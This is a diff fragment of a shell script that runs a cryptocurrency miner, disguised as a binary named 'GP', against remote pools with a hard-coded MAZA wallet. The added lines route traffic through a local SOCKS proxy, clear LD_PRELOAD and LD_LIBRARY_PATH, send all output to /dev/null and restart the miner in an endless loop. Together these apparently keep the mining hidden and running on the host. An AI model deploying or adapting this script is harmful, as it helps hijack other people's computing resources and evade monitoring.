@@ -34,5 +34,21 @@ sleep 2
 
 curl -x socks5h://127.0.0.1:1082 ifconfig.me
 
+sleep 2
 
+echo ""
+echo ""
+echo ""
+echo ""
+
+unset LD_PRELOAD
+unset LD_PRELOAD_ENV
+unset LD_LIBRARY_PATH
+
+sleep 2
+
+while true
+do
 ./GP --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019\!flyingsaucer-us.teatspray.fun:7019 --main-pool-reconnect 1440 --wallet MGaypRJi43LcQxrgoL2CW28B31w4owLvv8 --password $currentdate,c=MAZA,zap=MAZA --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+sleep 2
+done
